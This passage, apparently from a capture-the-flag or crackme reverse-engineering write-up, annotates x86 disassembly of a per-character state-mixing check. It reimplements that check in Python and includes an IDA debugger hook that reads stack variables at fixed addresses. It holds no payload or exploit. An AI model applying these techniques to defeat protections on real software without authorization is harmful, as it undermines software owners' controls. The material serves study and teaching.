&#125;&#125;&#125;&#125;&#125; else (inp &gt; &#x27;Z&#x27;) &#123;&#123;&#123;&#123;&#123;</span></span><br><span class="line">                    <span class="number">0x0040A107</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">                    <span class="number">0x0040A357</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0AEh</span></span><br><span class="line">                    <span class="number">0x0040A35F</span>      <span class="keyword">imul</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="number">9</span></span><br><span class="line">                    <span class="number">0x0040A363</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">                <span class="comment">; &#125;&#125;&#125;&#125;&#125;.</span></span><br><span class="line">			<span class="comment">; &#125;&#125;&#125;&#125; else (inp &lt; &#x27;A&#x27;) &#123;&#123;&#123;&#123;</span></span><br><span class="line">                <span class="comment">; the same as above inp &gt; &#x27;Z&#x27;.</span></span><br><span class="line">            <span class="comment">; &#125;&#125;&#125;&#125;.</span></span><br><span class="line">        <span class="comment">; &#125;&#125;&#125; else (inp &gt;= &#x27;a&#x27;) &#123;&#123;&#123;</span></span><br><span class="line">            <span class="number">0x0040A307</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">7Ah</span> <span class="comment">; &#x27;z&#x27;</span></span><br><span class="line">            <span class="comment">; if inp &lt;= &#x27;z&#x27; &#123;&#123;&#123;&#123;</span></span><br><span class="line">                <span class="number">0x0040A30D</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                <span class="number">0x0040A310</span>      <span class="keyword">sub</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">                <span class="number">0x0040A313</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">            <span class="comment">; &#125;&#125;&#125;&#125; else (inp &gt; &#x27;z&#x27;) &#123;&#123;&#123;&#123;</span></span><br><span class="line">				<span class="comment">; the same as above inp &gt; &#x27;Z&#x27;.</span></span><br><span class="line">            <span class="comment">; &#125;&#125;&#125;&#125;.</span></span><br><span class="line">        <span class="comment">; &#125;&#125;&#125;.</span></span><br><span class="line">    <span class="comment">; &#125;&#125;.</span></span><br><span class="line"><span class="comment">; &#125;.</span></span><br></pre></td></tr></table></figure>

<p>This part is a extremely complex function, as:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">num, shift</span>): <span class="keyword">return</span> ((num &lt;&lt; shift) | (num &gt;&gt; (<span class="number">0x20</span>-shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">num, shift</span>): <span class="keyword">return</span> ((num &gt;&gt; shift) | (num &lt;&lt; (<span class="number">0x20</span>-shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">switch_case</span>(<span class="params">inp, state</span>):</span><br><span class="line">    <span class="keyword">if</span> state &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> inp &lt; <span class="number">0x40</span>:</span><br><span class="line">            <span class="keyword">if</span> inp &amp; <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                state = (state - (inp &lt;&lt; <span class="number">4</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                <span class="keyword">if</span> inp == <span class="number">0x30</span>: state |= <span class="number">0xF0F0F0F0</span></span><br><span class="line">            <span class="keyword">else</span>: state = ((state ^ <span class="number">0x55AA55AA</span>) + inp) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> inp % <span class="number">2</span> == <span class="number">0</span>: state = (rol32(state, <span class="number">3</span>) + <span class="number">0x12345678</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="keyword">else</span>: state = (ror32(state, <span class="number">5</span>) ^ <span class="number">0x87654321</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (state ^ inp) &amp; <span class="number">0x80000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) &lt;= inp &lt;= <span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>): state = (state - inp) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) &lt;= inp &lt;= <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>):</span><br><span class="line">                state = (state + inp) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                <span class="keyword">if</span> state &amp; <span class="number">0x100</span> == <span class="number">0x100</span>: state ^= <span class="number">0x13371337</span></span><br><span class="line">            <span class="keyword">else</span>: state = (state * <span class="number">9</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            state = (state - <span class="number">0x21524111</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0x60</span> &lt;= inp: state = state ^ ((inp * <span class="number">0x21</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>

<p>And in the second part, the [ebp-0Ch] is the round index, and the [ebp-10h] is the round amount:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0040A0F5</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A0FA</span>      <span class="keyword">inc</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A231</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="number">0x0040A25D</span>      <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="number">0x0040A374</span>      <span class="keyword">push</span> <span class="number">5</span></span><br><span class="line"><span class="number">0x0040A376</span>      <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0040A377</span>      <span class="keyword">div</span> <span class="built_in">ecx</span> <span class="comment">; inp % 5</span></span><br><span class="line"><span class="number">0x0040A379</span>      <span class="keyword">inc</span> <span class="built_in">edx</span></span><br><span class="line"><span class="number">0x0040A37A</span>      <span class="keyword">inc</span> <span class="built_in">edx</span> <span class="comment">; inp % 5 + 2, this is the amount of round</span></span><br><span class="line"><span class="number">0x0040A37B</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>], <span class="built_in">edx</span></span><br><span class="line"><span class="number">0x0040A37E</span>      <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A387</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A391</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="comment">; begin (inp % 5) + 2 rounds:</span></span><br><span class="line"><span class="number">0x0040A39E</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A3A1</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">80000000h</span></span><br><span class="line"><span class="comment">; if state &amp; 0x80000000 == 0x80000000 &#123;</span></span><br><span class="line"><span class="number">0x0040A3AF</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A3B2</span>      <span class="keyword">shl</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A3B4</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="number">4C11DB7h</span></span><br><span class="line"><span class="comment">; &#125; else (state &amp; 0x80000000 == 0) &#123;</span></span><br><span class="line"><span class="number">0x0040A3C6</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A3C9</span>      <span class="keyword">shl</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="comment">;&#125;. </span></span><br><span class="line"><span class="number">0x0040A3B9</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A3CE</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A3D0</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0C4h</span></span><br><span class="line"><span class="number">0x0040A3D8</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A3DB</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">80000001h</span></span><br><span class="line"><span class="number">0x0040A3E7</span>      <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="comment">; if eax == 0 &#123;</span></span><br><span class="line">    <span class="number">0x0040A3EB</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="number">0x0040A3ED</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">    <span class="number">0x0040A3F3</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="number">0x0040A3F6</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="comment">; &#125; else (eax == 1) &#123;</span></span><br><span class="line">    <span class="number">0x0040A405</span>      <span class="keyword">imul</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="number">0Ah</span></span><br><span class="line">    <span class="number">0x0040A409</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="comment">; &#125;.</span></span><br><span class="line"><span class="number">0x0040A40C</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A3D8</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A3E6</span>      <span class="keyword">inc</span> <span class="built_in">eax</span> <span class="comment">; round tag ++</span></span><br><span class="line"><span class="number">0x0040A5AA</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A5AD</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A391</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="comment">; cmp with round amount</span></span><br><span class="line"><span class="comment">; loop end</span></span><br></pre></td></tr></table></figure>

<p>This is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">inp, state</span>):</span><br><span class="line">    round_num = inp % <span class="number">5</span> + <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(round_num):</span><br><span class="line">        tmp = state &amp; <span class="number">0x80000000</span></span><br><span class="line">        state = (state &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tmp == <span class="number">0</span>: state ^= <span class="number">0x4C11DB7</span></span><br><span class="line">        <span class="keyword">if</span> i &amp; <span class="number">1</span> == <span class="number">0</span>: state ^= inp</span><br><span class="line">        <span class="keyword">else</span>:  state = (state + (i * <span class="number">10</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>

<p>Part 3:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0040A39E</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A5A4</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A5A7</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A41D</span>      <span class="keyword">shr</span> <span class="built_in">eax</span>, <span class="number">10h</span></span><br><span class="line"><span class="number">0x0040A420</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A423</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A426</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A429</span>      <span class="keyword">shr</span> <span class="built_in">eax</span>, <span class="number">8</span></span><br><span class="line"><span class="number">0x0040A42C</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A42F</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A43A</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A43D</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">0Fh</span></span><br><span class="line"><span class="number">0x0040A440</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">7</span></span><br><span class="line"><span class="comment">; if eax &gt;= 7 &#123;</span></span><br><span class="line">    <span class="number">0x0040A445</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line">    <span class="number">0x0040A44A</span>      <span class="keyword">inc</span> <span class="built_in">eax</span></span><br><span class="line">    <span class="number">0x0040A44E</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="number">0x0040A451</span>      <span class="keyword">not</span> <span class="built_in">eax</span></span><br><span class="line">    <span class="number">0x0040A453</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="comment">; &#125; else (eax &lt; 7) &#123;</span></span><br><span class="line">	<span class="number">0x0040A458</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="number">0</span></span><br><span class="line"><span class="comment">; &#125;.</span></span><br><span class="line"><span class="comment">; dword ptr [ebp+8] != 0:</span></span><br><span class="line"><span class="number">0x0040A46F</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A472</span>      <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0040A473</span>      <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0040A474</span>      <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0x0040A475</span>      <span class="keyword">leave</span></span><br><span class="line"><span class="number">0x0040A476</span>      <span class="keyword">retn</span> <span class="number">8</span></span><br><span class="line"><span class="number">0x0040A5AA</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span><span class="comment">; write to [ebp-0Ch]</span></span><br></pre></td></tr></table></figure>

<p>In the end of this part, the value of [ebp-0Ch] is updated. This part is as:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tail_func</span>(<span class="params">inp, state</span>):</span><br><span class="line">    tmp = (state &gt;&gt; <span class="number">0x10</span>) ^ state</span><br><span class="line">    tmp1 = (tmp &gt;&gt; <span class="number">8</span>) ^ tmp</span><br><span class="line">    <span class="keyword">if</span> tmp1 &amp; <span class="number">0xF</span> &gt; <span class="number">7</span>: state = (~state) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>

<p>Therefore, we can search for the middle vars during the function, and the result is: the addr of ebp during the function is at <code>0x19F328</code>. [ebp-8] is<code>0x19F320</code>, as the tail_func tmp1; [ebp+8] is<code>0x19F330</code>, as the state in func. Add them to the mix hook:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_dump_once</span>(<span class="params">tid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">global</span> g_fp, g_last_dump16, g_dump_count</span><br><span class="line">    <span class="keyword">if</span> MAX_DUMPS <span class="keyword">and</span> g_dump_count &gt;= MAX_DUMPS: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>: p = ida_dbg.get_reg_val(<span class="string">&quot;EBX&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] get_reg_val(EBX) failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> p &lt; <span class="number">0x10000</span>: <span class="keyword">return</span></span><br><span class="line">    data = dbg_read_mem(p, READ_SIZE)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] failed to read <span class="subst">&#123;READ_SIZE&#125;</span> bytes @ EBX=0x<span class="subst">&#123;p:08X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; READ_SIZE: data += <span class="string">b&quot;\x00&quot;</span> * (READ_SIZE - <span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">if</span> DEDUP_CONSECUTIVE <span class="keyword">and</span> g_last_dump16 == data: <span class="keyword">return</span></span><br><span class="line">    out = data + (<span class="string">b&quot;\x00&quot;</span> * PAD_SIZE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g_fp.write(out)</span><br><span class="line">        g_fp.flush()</span><br><span class="line">        g_last_dump16 = data</span><br><span class="line">        g_dump_count += <span class="number">1</span></span><br><span class="line">        ebp_arr = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): ebp_arr[i] = read_dword_from_target(<span class="number">0x19F354</span>+<span class="number">4</span>*i)</span><br><span class="line">        state = read_dword_from_target(<span class="number">0x19F330</span>)</span><br><span class="line">        tail_num = read_dword_from_target(<span class="number">0x19F320</span>) &amp; <span class="number">0xF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] #<span class="subst">&#123;g_dump_count&#125;</span> hit 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span> | EBX=0x<span class="subst">&#123;p:08X&#125;</span> | [EBP-0x10~EBP-0x4] = &quot;</span>+<span class="string">&quot; &quot;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;v:08X&#125;</span>&quot;</span> <span class="keyword">for</span> v <span class="keyword">in</span> ebp_arr)+<span class="string">f&quot; | state = 0x<span class="subst">&#123;state:08X&#125;</span> | tail_num = <span class="subst">&#123;tail_num&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] file write error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>The total function of these 3 part is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">byte_func</span>(<span class="params">inp, state</span>):</span><br><span class="line">    state = switch_case(inp, state)</span><br><span class="line">    state = round_func(inp, state)</span><br><span class="line">    state = tail_func(inp, state)</span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>

<p>After this part and before the next char is loaded:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0040A426</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A435</span>      <span class="keyword">inc</span> <span class="built_in">eax</span> <span class="comment">; add the amount of char processed</span></span><br><span class="line"><span class="number">0x0040A42F</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A0CB</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A0CE</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">80000003h</span></span><br><span class="line"><span class="number">0x0040A0DA</span>      <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span> <span class="comment">; and with 3, the case of per 4 char an outer round</span></span><br><span class="line"><span class="number">0x0040A0EF</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="number">13h</span> <span class="comment">; cmp with end encryption</span></span><br><span class="line"><span class="number">0x0040A107</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A109</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0x0040A10F</span>      <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">1</span></span><br><span class="line"><span class="number">0x0040A06D</span>      <span 